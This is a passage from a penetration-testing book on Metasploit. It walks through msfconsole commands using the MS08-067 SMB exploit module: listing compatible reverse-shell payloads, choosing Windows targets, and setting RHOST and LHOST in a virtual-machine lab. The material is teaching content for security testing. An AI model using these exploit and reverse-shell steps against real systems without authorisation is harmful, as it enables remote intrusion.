style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:21pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBPIPE</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">BROWSER</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The pipe name to use (BROWSER, SRVSVC)</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_177.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_178.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">0 Automatic Targeting</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_179.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This contextual approach to accessing options keeps the interface simpler and allows you to focus only on the options that matter at the moment.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark165">msf&gt; show payloads</a><a name="bookmark182">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Recall from Chapter 2 that payloads are platform-specific portions of code delivered to a target. As with <span class="s25">show options</span>, when you run <span class="s25">show payloads </span>from a module-specific prompt, Metasploit displays only the payloads that are com- patible with that module. In the case of Microsoft Windows–based exploits, these payloads may be as simple as a command prompt on the target or as complex as a full graphical interface on the target machine. To see an active list of payloads, run the following command:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_180.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf&gt; <span class="s24">show payloads</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_181.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This would show you all payloads available in Metasploit; however, if you are in an actual exploit, you will see only payloads applicable to the attack. For example, running <span class="s25">show payloads </span>from the <span class="s25">msf exploit(ms08_067_netapi) </span>prompt would result in the output shown next.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the previous example we searched for the MS08-067 module. Now let’s find out the payloads for that module by entering <span class="s25">show payloads</span>. Notice in the example that only Windows-based payloads are shown. Metasploit will generally identify the type of payloads that can be used with a particu- lar attack.</p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:33pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt"><p class="s28" style="text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s43">show payloads</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Compatible Payloads</p></td><td style="width:193pt;border-top-style:solid;border-top-width:1pt" colspan="2" rowspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:16pt"><td style="width:194pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">===================</p></td></tr><tr style="height:16pt"><td style="width:194pt"><p class="s28" style="padding-top: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:39pt"><p class="s28" style="padding-top: 4pt;padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Rank</p></td><td style="width:154pt"><p class="s28" style="padding-top: 4pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:16pt"><td style="width:194pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:39pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:154pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:21pt"><td style="width:194pt"><p class="s43" style="padding-top: 4pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p></td><td style="width:39pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:154pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:16pt"><td style="width:194pt"><p class="s28" style="padding-top: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">windows/shell/reverse_ipv6_tcp</p></td><td style="width:39pt"><p class="s28" style="padding-top: 4pt;padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:154pt"><p class="s28" style="padding-top: 4pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Windows Command Shell, Reverse TCP</p></td></tr></table><p class="s25" style="padding-left: 282pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Stager (IPv6)</p><p class="s25" style="padding-left: 282pt;text-indent: -245pt;text-align: left;">windows/shell/reverse_nonx_tcp normal Windows Command Shell, Reverse TCP Stager (No NX or Win7)</p><p class="s25" style="padding-left: 282pt;text-indent: -245pt;text-align: left;">windows/shell/reverse_ord_tcp normal Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)</p><p class="s25" style="padding-left: 282pt;text-indent: -245pt;text-align: left;">windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">windows/shell/reverse_tcp_allports normal Windows Command Shell, Reverse</p><p class="s25" style="padding-left: 282pt;text-indent: 0pt;line-height: 11pt;text-align: left;">All-Port TCP Stager</p><p class="s25" style="padding-left: 282pt;text-indent: -245pt;text-align: left;">windows/shell_bind_tcp normal Windows Command Shell, Bind TCP Inline</p><p class="s25" style="padding-bottom: 4pt;padding-left: 287pt;text-indent: -250pt;text-align: left;">windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_182.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we enter <span class="s25">set payload windows/shell/reverse_tcp </span>to select the <span class="s25">reverse_tcp </span>payload. When we enter <span class="s25">show options </span>again we see that additional options are shown:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_183.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set payload windows/shell/reverse_tcp </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">payload =&gt; windows/shell/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">show options </span><span class="s30">8</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:21pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBPIPE</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">BROWSER</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The pipe name to use (BROWSER, SRVSVC)</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-top: 7pt;padding-left: 24pt;text-indent: 0pt;text-align: left;">@ <span class="s25">Payload options (windows/shell/reverse_tcp):</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:16pt"><td style="width:13pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:217pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:41pt"><td style="width:13pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 7pt;text-indent: 0pt;text-align: left;">EXITFUNC LHOST LPORT</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;text-align: left;">thread</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;text-align: left;">4444</p></td><td style="width:9pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 21pt;text-indent: 0pt;text-align: justify;">yes yes yes</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:217pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 63pt;text-indent: 0pt;text-align: left;">Exit technique: seh, thread, process The local address</p><p class="s28" style="text-indent: 0pt;line-height: 11pt;text-align: left;">The local port</p></td></tr></table><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">Notice that when the payload is selected at <span class="s32">O </span>and the options are dis- played at <span class="s32">8</span>, we are presented with some additional options in the payload section at <span class="s32">@</span>, such as <span class="s25">LHOST </span>and <span class="s25">LPORT</span>. In this example, you could configure the payload to connect back to the attacker machine on a specific IP address</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">and port number, called a <span class="s19">reverse payload</span>. In reverse payloads, the connection is actually triggered by the target machine and it connects to the attacker.</p><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">You might use this technique to circumvent a firewall or NAT installation. We’ll configure this exploit with both the <span class="s25">LHOST </span>and <span class="s25">RHOST </span>options. <span class="s25">LHOST</span>,</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">our attacking machine, will connect back from the target machine (<span class="s25">RHOST</span>) on the default TCP port (4444).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark166">msf&gt; show targets</a><a name="bookmark183">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Modules often list vulnerable potential targets. For example, because the vul- nerability targeted by MS08-067 relies on hard-coded memory addresses, the exploit is specific to operating systems with specific patch levels, language version, and security implementations (as explained in detail in Chapters 14 and 15). Using the <span class="s25">show targets </span>command at the <span class="s25">msf MS08-067 </span>prompt displays a list of 60 exploit targets (with only a portion shown in the following exam- ple). The success of the exploit will depend on the version of Windows you are targeting. Sometimes automatic detection will not work and could even trigger the wrong exploit, which will usually lead to a service crash.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_184.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">show targets</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_185.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_186.png"/></span></p><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit targets: Id Name</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">0 Automatic Targeting</span></p><ol id="l9"><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 9pt;text-align: left;">Windows 2000 Universal</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows XP SP0/SP1 Universal</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows XP SP2 English (NX)</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows XP SP3 English (NX)</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP0 Universal</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP1 English (NO NX)</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP1 English (NX)</p></li><li><p class="s25" style="padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP2 English (NO NX)</p></li><li><p class="s25" style="padding-bottom: 3pt;padding-left: 120pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP2 English (NX)</p></li></ol><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_187.png"/></span></p><p style="padding-top: 4pt;text-indent: 0pt;line-height: 16pt;text-align: right;">In this example, you can see that the exploit lists Automatic Targeting <span class="s32">O</span></p><p style="text-indent: 0pt;line-height: 10pt;text-align: right;">as one option. Often, an exploit module will attempt to target the operating</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">system automatically based on its version and select an exploit based on the system’s fingerprint. However, it’s often best to try to identify the appropriate exploit yourself to avoid triggering the wrong exploit or a potentially destruc- tive one.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">This particular exploit is temperamental, and it has a tough time determining the oper- ating system. If you use this exploit, be sure to set the target as the specific operating system you use in testing on your VM (Windows XP SP2).</span></p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark167">info</a><a name="bookmark184">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When the short description of a module provided by the <span class="s25">show </span>and <span class="s25">search </span>com- mands isn’t sufficient, use the <span class="s25">info </span>command followed by the module name to display all the information, options, and targets available for that module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_188.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">info</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_189.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark168">set and unset</a><a name="bookmark185">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">All the options for a given Metasploit module must be either set or unset, especially if they are marked as <span class="s19">required </span>or <span class="s19">yes</span>. When you enter <span class="s25">show options</span>, you will see information that specifies whether a field is required. Use the <span class="s25">set </span>command to set an option (turn it on); use <span class="s25">unset </span>to turn a setting off. The next listing shows the <span class="s25">set </span>and <span class="s25">unset </span>commands in use.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">Notice that the variables are referenced using uppercase characters. This isn’t required, but it is considered good practice.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_190.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set RHOST 192.168.1.155 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set TARGET 3 </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">TARGET =&gt; 3</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">show options </span><span class="s30">@</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.155</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:21pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBPIPE</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">BROWSER</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The pipe name to use (BROWSER, SRVSVC)</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_191.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_192.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">3 Windows XP SP2 English (NX)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; unset RHOST Unsetting RHOST...</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_193.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: left;">At <span class="s32">O </span>we set the target IP address (<span class="s25">RHOST</span>) to <span class="s25">192.168.1.155 </span>(our target machine). At <span class="s32">8 </span>we <span class="s25">set </span>the target to <span class="s25">3</span>, the “Windows XP SP2 English (NX)” that we listed with <span class="s25">show targets </span><a href="#bookmark183" class="s31">in </a>“msf&gt; show targets” on page 62. Running <span class="s25">show options </span>at <span class="s32">@ </span>confirms that our settings have been populated, as shown in</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">the <span class="s25">Module options </span>output.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark169">setg and unsetg</a><a name="bookmark186">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">The <span class="s25">setg </span>and <span class="s25">unsetg </span>commands are used to set or unset a parameter globally within <span class="s19">msfconsole</span>. Using these commands can save you from having to re-enter the same information repeatedly, particularly in the case of frequently used options that rarely change, such as <span class="s25">LHOST</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark170">save</a><a name="bookmark187">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having configured global options with the <span class="s25">setg </span>command, use the <span class="s25">save </span>com- mand to save your current settings so they will be available next time you run the console. You can enter the <span class="s25">save </span>command at any time in Metasploit to save your current place.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_194.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">msf exploit(ms08_067_netapi) &gt; <span class="s24">save</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Saved configuration to: /root/.msf3/config msf exploit(ms08_067_netapi) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_195.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The location in which the configuration is stored, <span class="s19">/root/.msf3/config</span>, is shown on the screen. If for some reason you need to start over, move or delete this file to revert to the default settings.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark171">Exploiting Your First Machine</a><a name="bookmark188">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">With some of the basics behind us and an understanding of how to set vari- ables within <span class="s19">msfconsole</span>, let’s exploit our first machine. To do so, fire up your Windows XP Service Pack 2 and Ubuntu 9.04 virtual machines. We’ll use Metasploit from within Back|Track.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">If you used the vulnerability scanners discussed in Chapter 4 against your virtual Windows XP SP2 machine, you will have encountered the vulnerabil- ity we’ll exploit in this chapter: the MS08-067 exploit. We’ll begin by finding this vulnerability on our own.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As your skills as a penetration tester improve, the discovery of certain open ports will trigger ideas about how you might exploit a particular service. One of the best ways to conduct this check is by using <span class="s19">nmap</span>’s script options within Metasploit as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 